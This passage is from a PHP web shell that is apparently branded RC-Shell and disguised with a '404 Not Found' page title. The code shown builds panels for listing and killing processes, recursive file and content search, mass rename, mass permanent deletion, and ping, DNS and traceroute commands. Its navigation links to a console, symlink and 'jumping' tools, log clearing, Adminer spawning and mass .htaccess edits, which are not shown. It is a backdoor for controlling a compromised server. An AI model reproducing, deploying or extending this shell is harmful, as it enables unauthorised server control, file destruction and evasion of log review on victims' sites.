            if (count($p) < 4) continue;
            $rows[] = array('pid' => $p[0], 'user' => $p[1], 'cpu' => $p[2], 'mem' => $p[3], 'cmd' => isset($p[4]) ? $p[4] : '-');
        }
    }
    $html .= '<div class="small text-muted mb-2">Total <b>' . count($rows) . '</b> process(es). Click the kill button to terminate one.</div>';
    if (empty($rows)) {
        $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> No processes retrieved (ps/tasklist unavailable).</div>';
    } else {
        $html .= '<div class="table-responsive" style="max-height:60vh;overflow:auto"><table class="mb-0"><thead><tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th><th>Action</th></tr></thead><tbody>';
        $self = (string)getmypid();
        foreach ($rows as $rw) {
            $html .= '<tr>' . '<td><span class="pm">' . htmlspecialchars($rw['pid']) . '</span></td>'
                . '<td>' . htmlspecialchars($rw['user']) . '</td>'
                . '<td>' . htmlspecialchars($rw['cpu']) . '</td>'
                . '<td>' . htmlspecialchars($rw['mem']) . '</td>'
                . '<td class="text-break" style="white-space:normal">' . htmlspecialchars($rw['cmd']) . '</td>'
                . '<td>' . ($rw['pid'] === $self
                    ? '<span class="pm text-info" title="This script">SELF</span>'
                    : '<form method="post" class="d-inline" onsubmit="return confirm(\'Kill process PID ' . htmlspecialchars($rw['pid']) . '?\');"><input type="hidden" name="kill" value="' . htmlspecialchars($rw['pid']) . '"><button class="ic dg" title="Kill"><i class="bi bi-x-octagon"></i></button></form>')
                . '</td></tr>';
        }
        $html .= '</tbody></table></div>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'search') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-search me-1 text-primary"></i> File Search <small class="text-muted">— find files by name or content</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    if (isset($_POST['search'])) {
        $target = isset($_POST['sdir']) && $_POST['sdir'] !== '' ? (string)$_POST['sdir'] : $CUR;
        $mode = isset($_POST['smode']) && $_POST['smode'] === 'content' ? 'content' : 'name';
        $pat = isset($_POST['spat']) ? trim((string)$_POST['spat']) : '';
        $finds = array(); $nsc = 0;
        $fdir = is_file($target) ? dirname($target) : $target;
        if ($pat !== '' && is_dir($fdir)) {
            $usep = trim($pat);
            $c = $usep === '' ? '' : $usep[0];
            $isDelim = in_array($c, array('/', '#', '~', '%', '!', '@'), true) && @preg_match($usep, '') !== false;
            if (!$isDelim) {
                $g = preg_quote($usep, '/');
                $g = str_replace(array('\*', '\?'), array('.*', '.'), $g);
                $usep = '/' . $g . ($mode === 'content' ? '/i' : '/');
            }
            searchFiles($fdir, 0, $mode, $usep, $finds, $nsc);
            $html .= '<hr class="my-2"><div class="small text-muted mb-2">Pattern: <b>' . htmlspecialchars($pat) . '</b> · Mode: <b>' . $mode . '</b> · In: <code>' . htmlspecialchars($fdir) . '</code> · <b>' . count($finds) . '</b> match(es) from <b>' . $nsc . '</b> item(s) scanned.</div>';
            if (empty($finds)) {
                $html .= '<div class="alert alert-info m-0"><i class="bi bi-info-circle"></i> No matches found.</div>';
            } else {
                $html .= '<div class="table-responsive" style="max-height:55vh;overflow:auto"><table class="mb-0"><tbody>';
                foreach ($finds as $f) {
                    $rp = str_replace($CUR, '', $f['f']);
                    if ($mode === 'content' && $f['l'] > 0) {
                        $html .= '<tr><td class="text-muted text-end" style="white-space:nowrap">' . $f['l'] . '</td><td class="text-break" style="white-space:normal"><a class="fn" href="' . mkUrl(array('path' => dirname($f['f']), 'edit' => basename($f['f']))) . '">' . htmlspecialchars($rp) . '</a></td><td class="text-muted text-break" style="white-space:normal;max-width:55vw">' . htmlspecialchars($f['t']) . '</td></tr>';
                    } else {
                        $html .= '<tr><td></td><td class="text-break" style="white-space:normal"><a class="fn" href="' . mkUrl(array('path' => dirname($f['f']))) . '">' . htmlspecialchars($rp) . '</a></td><td class="text-muted" style="white-space:nowrap">' . fmt(@filesize($f['f'])) . '</td></tr>';
                    }
                }
                $html .= '</tbody></table></div>';
            }
            $html .= '<div class="mt-2"><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('tool' => 'search')) . '"><i class="bi bi-arrow-left"></i> New search</a></div>';
        } else {
            $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> Invalid target directory or empty pattern.</div>';
        }
    } else {
        $html .= '<div class="alert alert-warning m-0 mb-2"><i class="bi bi-exclamation-triangle"></i> Name mode: glob (<code>*.php</code>, <code>*config*</code>) or regex (<code>/^index/</code>). Content mode: regex searched line-by-line in text/code files. Depth limit 5, max 10000 items.</div>';
        $html .= '<form method="post"><div class="mb-2"><label class="form-label small text-muted">Search in (directory)</label><input class="form-control" type="text" name="sdir" value="' . htmlspecialchars($CUR) . '"></div><div class="mb-2"><label class="form-label small text-muted">Type</label><select class="form-select" name="smode"><option value="name">Filename</option><option value="content">File content</option></select></div><div class="mb-2"><label class="form-label small text-muted">Pattern</label><input class="form-control font-monospace" type="text" name="spat" placeholder="*.php or /eval\s*\(/i or base64" required></div><button class="btn btn-primary" name="search" value="1"><i class="bi bi-search"></i> Search</button></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'massrename') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-pencil-square me-1 text-warning"></i> Mass Rename <small class="text-muted">— regex rename files & folders</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    if (isset($_POST['ren'])) {
        $base = isset($_POST['base']) && $_POST['base'] !== '' ? (string)$_POST['base'] : $CUR;
        $find = isset($_POST['find']) ? (string)$_POST['find'] : '';
        $repl = isset($_POST['repl']) ? (string)$_POST['repl'] : '';
        $apply = isset($_POST['apply']);
        $out = array(); $nsc = 0;
        if (is_dir($base) && @preg_match($find, '') !== false && $find !== '') {
            if (!$apply) $html .= '<div class="alert alert-info mb-2"><i class="bi bi-eye"></i> Preview only — nothing changed yet. Review, then Apply.</div>';
            massRenameDir($base, 0, $find, $repl, !$apply, $out, $nsc);
            if (empty($out)) {
                $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> No item matches the pattern.</div>';
            } else {
                if ($apply) $html .= '<div class="alert alert-success mb-2"><i class="bi bi-check-circle"></i> Applied <b>' . count($out) . '</b> rename(s) in <code>' . htmlspecialchars($base) . '</code>.</div>';
                $html .= '<div class="small text-muted mb-2"><b>' . count($out) . '</b> rename(s) ' . ($apply ? 'applied' : 'planned') . ' · ' . $nsc . ' item(s) scanned.</div>';
                $html .= '<div class="table-responsive" style="max-height:55vh;overflow:auto"><table class="mb-0"><tbody>';
                foreach ($out as $rw) {
                    $html .= '<tr><td class="text-muted text-break" style="white-space:normal">' . htmlspecialchars($rw[0]) . '</td><td class="px-2 text-muted">→</td><td class="text-break text-success" style="white-space:normal">' . htmlspecialchars($rw[1]) . '</td></tr>';
                }
                $html .= '</tbody></table></div>';
                if (!$apply) {
                    $html .= '<form method="post" onsubmit="return confirm(\'Apply these ' . count($out) . ' rename(s) now?\')" class="mt-2"><input type="hidden" name="base" value="' . htmlspecialchars($base) . '"><input type="hidden" name="find" value="' . htmlspecialchars($find) . '"><input type="hidden" name="repl" value="' . htmlspecialchars($repl) . '"><input type="hidden" name="apply" value="1"><button class="btn btn-danger" name="ren" value="1"><i class="bi bi-check-lg"></i> Apply ' . count($out) . ' Renames</button></form>';
                } else {
                    $html .= '<div class="mt-2"><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('tool' => 'massrename')) . '"><i class="bi bi-arrow-left"></i> Back</a></div>';
                }
            }
        } else {
            $html .= '<div class="alert alert-danger m-0"><i class="bi bi-exclamation-triangle"></i> Invalid base directory or invalid/empty regex.</div>';
        }
    } else {
        $html .= '<div class="alert alert-warning m-0 mb-2"><i class="bi bi-exclamation-triangle"></i> Recursively renames files AND folders (max depth 4). Pattern is a PHP regex: <code>/^(old_)?(.*)$/</code> + <code>new__$2</code>. Always Preview first.</div>';
        $html .= '<form method="post"><div class="mb-2"><label class="form-label small text-muted">Base directory</label><input class="form-control" type="text" name="base" value="' . htmlspecialchars($CUR) . '"></div><div class="mb-2"><label class="form-label small text-muted">Find regex</label><input class="form-control font-monospace" type="text" name="find" value="" placeholder="/^(old_)?(.*)$/" required></div><div class="mb-2"><label class="form-label small text-muted">Replace with</label><input class="form-control font-monospace" type="text" name="repl" value="" placeholder="new__$2"></div><button class="btn btn-warning" name="ren" value="1"><i class="bi bi-eye"></i> Preview Renames</button></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'massdelete') {
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-trash me-1 text-danger"></i> Mass Delete <small class="text-muted">— bulk delete by pattern</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    if (isset($_POST['delpreview']) || isset($_POST['delexec'])) {
        $base = isset($_POST['base']) && $_POST['base'] !== '' ? (string)$_POST['base'] : $CUR;
        $pat = isset($_POST['pat']) ? (string)$_POST['pat'] : '';
        $ext = isset($_POST['ext']) ? (string)$_POST['ext'] : '';
        $out = array(); $nsc = 0;
        if (is_dir($base)) {
            massDeleteDir($base, 0, $pat, $ext, $out, $nsc);
            if (isset($_POST['delexec'])) {
                $deleted = 0; $fail = 0;
                foreach ($out as $fp) { @unlink($fp) ? $deleted++ : $fail++; }
                $html .= '<div class="alert alert-' . ($fail ? 'warning' : 'success') . ' mb-2"><i class="bi bi-check-circle"></i> Deleted <b>' . $deleted . '</b> file(s)' . ($fail ? ' · Failed <b>' . $fail . '</b>' : '') . '.</div>';
                $html .= '<div class="mt-2"><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('tool' => 'massdelete')) . '"><i class="bi bi-arrow-left"></i> Back</a></div>';
            } else {
                $html .= '<div class="small text-muted mb-2">Scan of <code>' . htmlspecialchars($base) . '</code> found <b>' . count($out) . '</b> matching file(s).</div>';
                if (empty($out)) {
                    $html .= '<div class="alert alert-warning m-0"><i class="bi bi-exclamation-triangle"></i> No file matches the criteria. Nothing to delete.</div>';
                } else {
                    $html .= '<div class="table-responsive" style="max-height:50vh;overflow:auto"><table class="mb-0"><tbody>';
                    foreach ($out as $f) {
                        $html .= '<tr><td class="text-break" style="white-space:normal">' . htmlspecialchars($f) . '</td><td class="text-muted" style="white-space:nowrap">' . fmt(@filesize($f)) . '</td></tr>';
                    }
                    $html .= '</tbody></table></div>';
                    $html .= '<form method="post" onsubmit="return confirm(\'PERMANENTLY DELETE these ' . count($out) . ' file(s)? This CANNOT be undone.\')" class="mt-2"><input type="hidden" name="base" value="' . htmlspecialchars($base) . '"><input type="hidden" name="pat" value="' . htmlspecialchars($pat) . '"><input type="hidden" name="ext" value="' . htmlspecialchars($ext) . '"><button class="btn btn-danger" name="delexec" value="1" onclick="return confirm(\'Last warning: permanently delete ' . count($out) . ' file(s)?\')"><i class="bi bi-trash"></i> Permanently Delete ' . count($out) . ' Files</button></form>';
                }
            }
        } else {
            $html .= '<div class="alert alert-danger m-0"><i class="bi bi-exclamation-triangle"></i> Invalid directory.</div>';
        }
    } else {
        $html .= '<div class="alert alert-danger m-0 mb-2"><i class="bi bi-exclamation-triangle"></i> DANGER: permanently deletes matching FILES (folders are skipped) recursively (max depth 4, max 10000 items). Pattern is glob (<code>*.tmp</code>) or regex (<code>/\.(log|bak)$/</code>), optional extension filter. Always Preview first.</div>';
        $html .= '<form method="post"><div class="mb-2"><label class="form-label small text-muted">Base directory</label><input class="form-control" type="text" name="base" value="' . htmlspecialchars($CUR) . '"></div><div class="mb-2"><label class="form-label small text-muted">Filename pattern (optional)</label><input class="form-control font-monospace" type="text" name="pat" placeholder="*.tmp or /\.(log|bak)$/"></div><div class="mb-2"><label class="form-label small text-muted">Extension filter (optional, e.g. log)</label><input class="form-control" type="text" name="ext" placeholder="log"></div><button class="btn btn-danger" name="delpreview" value="1"><i class="bi bi-eye"></i> Preview Matches</button></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
} elseif ($tool === 'network') {
    $ntab = isset($_GET['ntab']) ? (string)$_GET['ntab'] : '';
    $html = '<div class="tcard p-3 mb-3">';
    $html .= '<div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2"><h6 class="m-0"><i class="bi bi-globe me-1 text-info"></i> Network Tools <small class="text-muted">— ping / DNS / traceroute</small></h6><a class="btn btn-sm btn-outline-secondary" href="' . mkUrl(array('path' => $CUR)) . '"><i class="bi bi-x-lg"></i> Close</a></div>';
    $html .= '<div class="text-center mb-3"><a href="' . mkUrl(array('tool' => 'network', 'ntab' => 'ping')) . '">PING</a> &mdash; <a href="' . mkUrl(array('tool' => 'network', 'ntab' => 'dns')) . '">DNS LOOKUP</a> &mdash; <a href="' . mkUrl(array('tool' => 'network', 'ntab' => 'traceroute')) . '">TRACEROUTE</a></div>';
    $label = $ntab === 'dns' ? 'DNS Lookup' : ($ntab === 'traceroute' ? 'Traceroute' : 'Ping');
    $html .= '<div class="text-center mb-2">Mode : <span class="' . ($ntab === 'ping' || $ntab === '' ? 'text-danger' : 'text-warning') . ' fw-bold">' . $label . '</span></div>';
    $out = ''; $cmd = '';
    if (isset($_POST['ncmd'])) {
        $host = isset($_POST['host']) ? trim((string)$_POST['host']) : '';
        if ($host === '') {
            $html .= '<div class="alert alert-danger mb-2"><i class="bi bi-exclamation-triangle"></i> Enter a hostname or IP address.</div>';
        } else {
            if ($WIN) {
                if ($ntab === 'dns') $cmd = 'nslookup ' . escapeshellarg($host);
                elseif ($ntab === 'traceroute') $cmd = 'tracert ' . escapeshellarg($host);
                else $cmd = 'ping -n 4 ' . escapeshellarg($host);
            } else {
                if ($ntab === 'dns') $cmd = 'host ' . escapeshellarg($host) . ' 2>&1; nslookup ' . escapeshellarg($host) . ' 2>&1';
                elseif ($ntab === 'traceroute') $cmd = 'traceroute ' . escapeshellarg($host) . ' 2>&1';
                else $cmd = 'ping -c 4 ' . escapeshellarg($host);
            }
            $res = runcm($cmd);
            $out = (string)$res[0];
            $html .= '<div class="small text-muted mb-2"><span class="pm">' . htmlspecialchars($cmd) . '</span></div><div class="console">' . htmlspecialchars($out) . '</div>';
        }
        $html .= '<form method="post" class="mt-2"><input type="hidden" name="ntab" value="' . htmlspecialchars($ntab) . '"><div class="d-flex gap-2"><div class="input-group input-group-sm"><span class="input-group-text bg-dark text-success border-0 font-monospace">#</span><input class="form-control font-monospace" type="text" name="host" value="' . htmlspecialchars(isset($_POST['host']) ? $_POST['host'] : '') . '" placeholder="example.com or 1.2.3.4" required></div><button class="btn btn-sm btn-danger" name="ncmd" value="1"><i class="bi bi-play-fill"></i> Run</button></div></form>';
    } else {
        $html .= '<form method="post"><div class="d-flex gap-2"><div class="input-group input-group-sm"><span class="input-group-text bg-dark text-success border-0 font-monospace">#</span><input class="form-control font-monospace" type="text" name="host" placeholder="example.com or 1.2.3.4" required></div><button class="btn btn-sm btn-danger" name="ncmd" value="1"><i class="bi bi-play-fill"></i> Run</button></div></form>';
    }
    $html .= '</div>';
    $toolHtml = $html;
}
?>
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 Not Found</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
<style>
:root{--bg:#f3f5f9;--card:rgba(255,255,255,.86);--line:#e5e8f0;--txt:#1d2330;--mut:#7b8494;--acc:#5b6bf0;--acc2:#8b5cf6;--hov:rgba(20,28,60,.06);--sb:#141a2e}
[data-bs-theme="dark"]{--bg:#12141c;--card:rgba(23,27,39,.82);--line:#2b3040;--txt:#e7eaf1;--mut:#9aa2b4;--hov:rgba(255,255,255,.07);--sb:#0d101c}
*{box-sizing:border-box}
body{background:#dfe4ee url('https://images.unsplash.com/photo-1535868463750-c78d9543614f?q=80&w=1752&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center fixed;background-size:cover;color:var(--txt);font-size:13px;overflow:hidden}
body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:rgba(255,255,255,.66)}
html[data-bs-theme="dark"] body::before{background:rgba(0,0,0,.62)}
.app{display:flex;height:100vh;position:relative;z-index:1}
.sidebar{width:225px;color:#fff;height:100vh;overflow-y:auto;flex-shrink:0;display:flex;flex-direction:column}
.sidebar .brand{display:flex;align-items:center;justify-content:center;padding:10px 14px;margin:12px 14px;border-radius:12px;box-shadow:0 4px 16px rgba(190,35,35,.25)}
.sidebar .brand img{height:42px;width:auto}
.side-card{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.08)}
.side-card .a{font-size:10px;text-transform:uppercase;letter-spacing:1px;opacity:.6}
.bar{height:5px;background:rgba(255,255,255,.12);border-radius:4px;overflow:hidden;margin:6px 0}
.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2))}
.mini{font-size:10px;opacity:.6}
.side-nav{flex:1;padding:8px 0}
.side-nav a{display:flex;align-items:center;gap:9px;padding:7px 16px;color:rgba(255,255,255,.75);font-size:13px;text-decoration:none;border-left:3px solid transparent}
.side-nav a:hover,.side-nav a.on{color:#fff;background:rgba(255,255,255,.08);border-left-color:var(--acc)}
.side-nav a.dim{opacity:.55}
.side-nav h2{font-size:9px;text-transform:uppercase;letter-spacing:1px;opacity:.5;color:#fff;padding:8px 16px 2px;margin:0}
.side-nav hr{border-color:rgba(255,255,255,.08);margin:6px 14px}
.side-nav .r{margin-left:auto;font-size:10px;opacity:.4}
.main{flex:1;min-width:0;display:flex;flex-direction:column}
.topbar{display:flex;align-items:center;gap:10px;padding:8px 16px;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:20;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
.topbar .bc{flex:1;min-width:0;display:flex;align-items:center;gap:8px}
.breadcrumb{display:flex;flex-wrap:wrap;list-style:none;margin:0;padding:0;font-size:12px}
.breadcrumb li+li::before{content:"/";margin:0 6px;color:var(--mut)}
.breadcrumb a{color:var(--acc);text-decoration:none}
.breadcrumb .active{color:var(--mut)}
.pm{font-family:monospace;font-size:11px;padding:2px 6px;background:var(--hov);border-radius:5px;white-space:nowrap}
.content{padding:16px;overflow-y:auto;flex:1}
.status{display:flex;gap:10px;margin-bottom:14px}
.st{flex:1;border:1px solid var(--line);border-radius:10px;padding:10px 14px;display:flex;align-items:center;gap:10px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);box-shadow:0 8px 30px rgba(10,15,30,.06)}
.st b{font-size:17px;display:block;line-height:1.1}
.st small{color:var(--mut)}
.st i{font-size:18px}
.tcard{border:1px solid var(--line);border-radius:10px;overflow:hidden;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);box-shadow:0 8px 30px rgba(10,15,30,.06)}
.content .card{border:1px solid var(--line);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);box-shadow:0 8px 30px rgba(10,15,30,.06)}
.modal-content{background:rgba(255,255,255,.75);border:1px solid var(--line);border-radius:14px;backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);box-shadow:0 12px 40px rgba(10,15,30,.18)}
html[data-bs-theme="dark"] .modal-content{background:rgba(26, 30, 42, 0)}
.alert{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);box-shadow:0 6px 20px rgba(10,15,30,.08)}
.alert-success{--bs-alert-bg:rgba(25,135,84,.2);--bs-alert-border-color:rgba(25,135,84,.5)}
.alert-danger{--bs-alert-bg:rgba(220,53,69,.2);--bs-alert-border-color:rgba(220,53,69,.5)}
.alert-warning{--bs-alert-bg:rgba(255,193,7,.2);--bs-alert-border-color:rgba(255,193,7,.5)}
.alert-info{--bs-alert-bg:rgba(13,202,240,.2);--bs-alert-border-color:rgba(13,202,240,.5)}
.form-control,.form-select{background:rgba(255,255,255,.55);border:1px solid var(--line);color:var(--txt);border-radius:8px;backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px)}
html[data-bs-theme="dark"] .form-control,html[data-bs-theme="dark"] .form-select{background:rgba(30,35,50,.55)}
.form-control:focus,.form-select:focus{background:rgba(255,255,255,.82);border-color:var(--acc);box-shadow:0 0 0 3px rgba(91,107,240,.16)}
html[data-bs-theme="dark"] .form-control:focus,html[data-bs-theme="dark"] .form-select:focus{background:rgba(42,49,70,.82)}
html{--btng:rgba(255,255,255,.22)}
html[data-bs-theme="dark"]{--btng:rgba(255,255,255,.07)}
.btn{backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border-radius:9px}
.btn-primary{color:#fff;background:rgba(241, 0, 0, 0.38);border:1px solid rgba(0, 0, 0, 0.99)}
.btn-primary:hover,.btn-primary:focus{background:rgba(0, 0, 0, 0.56);border-color:rgba(255, 0, 0, 0.8)}
.btn-success{color:#fff;background:rgba(25,135,84,.38);border:1px solid rgba(25,135,84,.6)}
.btn-success:hover,.btn-success:focus{background:rgba(25,135,84,.56);border-color:rgba(25,135,84,.78)}
.btn-danger{color:#fff;background:rgba(220,53,69,.38);border:1px solid rgba(220,53,69,.6)}
.btn-danger:hover,.btn-danger:focus{background:rgba(220,53,69,.56);border-color:rgba(220,53,69,.78)}
.btn-warning{color:#5a4200;background:rgba(255,193,7,.42);border:1px solid rgba(255,193,7,.68)}
.btn-warning:hover,.btn-warning:focus{background:rgba(255,193,7,.58)}
.btn-outline-primary,.btn-outline-secondary,.btn-outline-success,.btn-outline-danger,.btn-outline-info,.btn-outline-warning{background:var(--btng)}
.modal-header{border-bottom:1px solid var(--line)}
.console{background:#0b0f0d;color:#39ff6e;border-radius:8px;padding:12px 14px;font:12px/1.5 Consolas,'Courier New',monospace;white-space:pre-wrap;word-break:break-all;min-height:60px;max-height:55vh;overflow:auto}
table{width:100%;border-collapse:collapse}
th{background:var(--hov);color:var(--mut);font-size:10px;text-transform:uppercase;letter-spacing:.5px;padding:8px 12px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap}
td{padding:7px 12px;border-bottom:1px solid var(--line);vertical-align:middle;white-space:nowrap}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover td{background:var(--hov)}
.fn{color:var(--txt);text-decoration:none;font-weight:500}
.fn:hover{color:var(--acc)}
.ic{width:26px;height:26px;display:inline-flex;align-items:center;justify-content:center;border-radius:6px;color:var(--mut);background:none;border:none;cursor:pointer}
.ic:hover{background:var(--hov);color:var(--acc)}
.ic.dg:hover{color:#dc3545}
.mb{display:none;background:none;border:none;color:var(--txt);font-size:20px;padding:2px 6px}
.editor{width:100%;min-height:420px;border:0;background:#1e1e1e;color:#d4d4d4;font-family:monospace;font-size:12px;padding:14px;resize:vertical;line-height:1.5}
.viewtxt{white-space:pre-wrap;word-break:break-word;background:#1e1e1e;color:#d4d4d4;font-size:13px;line-height:1.6;margin:0;padding:16px;font-family:monospace}
@media(max-width:768px){
    .sidebar{position:fixed;left:0;top:0;bottom:0;z-index:100;transform:translateX(-100%);transition:transform .25s;box-shadow:0 0 30px rgba(0,0,0,.4)}
    .sidebar.show{transform:none}
    .mb{display:block}
    .status{flex-direction:column}
    .content{padding:12px}
}
</style>
</head>
<body>
<div class="app">
<div class="sidebar" id="sb">
    <div class="brand"><img src="https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/logo.png" alt="Logo" style="height:42px;width:auto"></div>
    <div class="side-card">
        <div class="a">Disk Usage</div>
        <div class="bar"><i style="width:<?=intval($diskP)?>%"></i></div>
        <div class="mini"><?=fmt($diskU)?> / <?=fmt($diskT)?> (<?=$diskP?>%)</div>
    </div>
    <div class="side-nav">
        <h2>Navigation</h2>
        <a href="?" class="<?=$isBase ? 'on' : ''?>"><i class="bi bi-house-door"></i> Home</a>
        <a href="#srvinfo" data-bs-toggle="collapse"><i class="bi bi-server"></i> Server Info</a>
        <a href="javascript:void(0)" onclick="newD()"><i class="bi bi-folder-plus"></i> New Folder</a>
        <a href="javascript:void(0)" onclick="newF()"><i class="bi bi-file-earmark-plus"></i> New File</a>
        <a href="javascript:void(0)" onclick="upld()"><i class="bi bi-cloud-upload"></i> Upload</a>
        <a href="<?=mkUrl(array('console' => '', 'path' => $CUR))?>"><i class="bi bi-terminal"></i> Console</a>
        <h2>Tools</h2>
        <a href="<?=mkUrl(array('tool' => 'jumping', 'path' => $CUR))?>"><i class="bi bi-send"></i> Jumping</a>
        <a href="<?=mkUrl(array('tool' => 'symlink', 'path' => $CUR))?>"><i class="bi bi-link-45deg"></i> Symlink</a>
        <a href="<?=mkUrl(array('tool' => 'spawn', 'path' => $CUR))?>"><i class="bi bi-database"></i> Spawn Adminer</a>
        <a href="<?=mkUrl(array('tool' => 'process', 'path' => $CUR))?>"><i class="bi bi-cpu"></i> Process Running</a>
        <a href="<?=mkUrl(array('tool' => 'logview', 'path' => $CUR))?>"><i class="bi bi-file-earmark-text"></i> Error Log Viewer</a>
        <a href="<?=mkUrl(array('tool' => 'clearlog', 'path' => $CUR))?>"><i class="bi bi-trash"></i> Clear Log</a>
        <a href="<?=mkUrl(array('tool' => 'recent', 'path' => $CUR))?>"><i class="bi bi-clock-history"></i> Recent Files</a>
        <a href="<?=mkUrl(array('tool' => 'scanner', 'path' => $CUR))?>"><i class="bi bi-shield-check"></i> Virus Scanner</a>
        <a href="<?=mkUrl(array('tool' => 'massht', 'path' => $CUR))?>"><i class="bi bi-file-earmark-lock"></i> Mass .htaccess</a>
        <a href="<?=mkUrl(array('tool' => 'search', 'path' => $CUR))?>"><i class="bi bi-search"></i> File Search</a>
        <a href="<?=mkUrl(array('tool' => 'massrename', 'path' => $CUR))?>"><i class="bi bi-pencil-square"></i> Mass Rename</a>
        <a href="<?=mkUrl(array('tool' => 'massdelete', 'path' => $CUR))?>"><i class="bi bi-trash"></i> Mass Delete</a>
        <a href="<?=mkUrl(array('tool' => 'network', 'path' => $CUR))?>"><i class="bi bi-globe"></i> Network Tools</a>
        <h2>Quick Access</h2>
        <?php foreach ($quick as $q): if (is_dir($q[1])): ?>
        <a class="dim" href="<?=mkUrl(array('path' => $q[1]))?>"><i class="bi bi-folder2"></i> <?=htmlspecialchars($q[0])?><span class="r"><?php $qc = @scandir($q[1]); echo $qc ? count($qc) - 2 : 0; ?></span></a>
        <?php endif; endforeach; ?>
        <hr>
        <a href="<?=mkUrl(array('action' => 'logout'))?>" onclick="return confirm('Are you sure you want to log out?')"><i class="bi bi-box-arrow-left"></i> Log Out</a>
    </div>
</div>

<div class="main">
    <div class="topbar">
        <button class="mb" onclick="document.getElementById('sb').classList.toggle('show')"><i class="bi bi-list"></i></button>
        <div class="bc">
            <ol class="breadcrumb">
                <?php
                foreach ($paths as $id => $pat) {
                    if ($pat === '' && $id === 0) {
                        echo $id == $last_id
                            ? '<li class="active"><i class="bi bi-hdd"></i> /</li>'
                            : '<li><a href="' . mkUrl(array('path' => '/')) . '"><i class="bi bi-hdd"></i> /</a></li>';
                        continue;
                    }
                    if ($pat === '') continue;
                    $link = '';
                    for ($i = 0; $i <= $id; $i++) { $link .= $paths[$i]; if ($i != $id) $link .= "/"; }
                    $label = $id === 0 ? ' <i class="bi bi-hdd"></i> ' . htmlspecialchars($pat) : htmlspecialchars($pat);
                    echo $id == $last_id
                        ? '<li class="active">' . $label . '</li>'
                        : '<li><a href="' . mkUrl(array('path' => $link)) . '">' . $label . '</a></li>';
                }
                ?>
            </ol>
            <span class="pm text-info">[ <?=$cphtml?> ]</span>
        </div>
        <div class="d-flex gap-1">
            <button class="ic" title="Theme" onclick="tgt()"><i class="bi bi-moon-stars" id="ti"></i></button>
            <button class="ic" title="Upload" onclick="upld()"><i class="bi bi-cloud-upload"></i></button>
            <button class="ic" title="New Folder" onclick="newD()"><i class="bi bi-folder-plus"></i></button>
            <button class="ic" title="New File" onclick="newF()"><i class="bi bi-file-earmark-plus"></i></button>
            <button class="ic" title="Console" onclick="location.href='?console&path=<?=urlencode($CUR)?>'"><i class="bi bi-terminal"></i></button>
        </div>
    </div>

    <div class="content">
        <?php if ($msg !== ''):
            $ic = $mt === 'success' ? 'check-circle' : ($mt === 'danger' ? 'exclamation-triangle' : 'info-circle'); ?>
        <div class="alert alert-<?=$mt?> alert-dismissible fade show"><i class="bi bi-<?=$ic?>"></i> <?=$msg?><button type="button" class="btn-close" data-bs-dismiss="alert"></button></div>
        <?php endif; ?>

        <?php if ($view !== ''): ?>
        <div class="card mb-3"><div class="card-header py-2 d-flex justify-content-between align-items-center">
            <span><i class="bi bi-eye me-1"></i> View: <code><?=htmlspecialchars($view)?></code></span>
            <span>
                <a class="btn btn-sm btn-outline-primary" href="<?=mkUrl(array('action' => 'download', 'path' => $CUR, 'file' => $view))?>"><i class="bi bi-download"></i></a>
                <a class="btn btn-sm btn-outline-success" href="<?=mkUrl(array('path' => $CUR, 'edit' => $view))?>"><i class="bi bi-pencil"></i></a>
                <a class="btn btn-sm btn-outline-secondary" href="<?=mkUrl(array('path' => $CUR))?>"><i class="bi bi-x-lg"></i></a>
            </span>
